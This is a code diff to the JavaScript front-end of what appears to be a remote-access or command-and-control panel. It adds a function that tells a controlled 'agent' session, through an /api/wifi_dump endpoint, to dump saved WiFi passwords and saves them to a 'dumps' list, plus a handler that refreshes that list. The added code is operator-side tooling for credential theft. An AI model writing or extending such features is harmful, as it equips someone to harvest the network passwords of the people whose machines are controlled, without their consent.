@@ -1444,4 +1444,49 @@ document.addEventListener('DOMContentLoaded', function() {
         console.log('DEBUG: Dumps tab is active, refreshing');
         refreshDumps();
     }
+});
+
+function dumpWifiPasswords(agentId) {
+    showProgressBar(agentId, true, 'wifi');
+    updateProgressBar(agentId, 50, 'Dumping WiFi passwords...');
+    
+    fetch('/api/wifi_dump', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+            session_id: agentId
+        })
+    })
+    .then(response => response.json())
+    .then(data => {
+        if (data.error) {
+            throw new Error(data.error);
+        }
+        
+        showProgressBar(agentId, false);
+        appendToTerminal(`WiFi passwords dumped successfully\nSaved to: ${data.path}`, 'success', agentId);
+        
+        // Refresh dumps list
+        refreshDumps();
+    })
+    .catch(error => {
+        showProgressBar(agentId, false);
+        appendToTerminal(`Error dumping WiFi passwords: ${error.message}`, 'error', agentId);
+    });
+}
+
+// Initialize dumps tab functionality
+document.addEventListener('DOMContentLoaded', function() {
+    // Add refresh on tab switch
+    const dumpsTab = document.querySelector('[data-tab="dumps"]');
+    if (dumpsTab) {
+        dumpsTab.addEventListener('click', refreshDumps);
+    }
+
+    // Initialize if dumps tab is active
+    if (document.getElementById('dumps-tab')?.classList.contains('active')) {
+        refreshDumps();
+    }
 }); 
